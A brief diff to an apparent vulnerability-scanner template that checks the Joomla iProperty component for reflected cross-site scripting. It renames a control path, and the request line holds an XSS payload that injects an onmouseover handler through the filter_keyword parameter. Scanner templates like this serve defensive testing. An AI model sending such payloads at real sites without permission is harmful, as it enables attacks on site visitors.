@@ -16,7 +16,7 @@ request:
   path: "/iproperty/property-views/all-properties-with-map?filter_keyword=pihil%22onmouseover=%22alert(document.domain)%22style=%22position:absolute;width:100%;height:100%;top:0;left:0;%22f63m4&option=com_iproperty&view=allproperties&ipquicksearch=1"
 control:
   method: "GET"
-  path: "/.guardian-none-{{rand}}"
+  path: "/.kovo-none-{{rand}}"
 matchers-condition: "and"
 matchers:
   - type: "word"
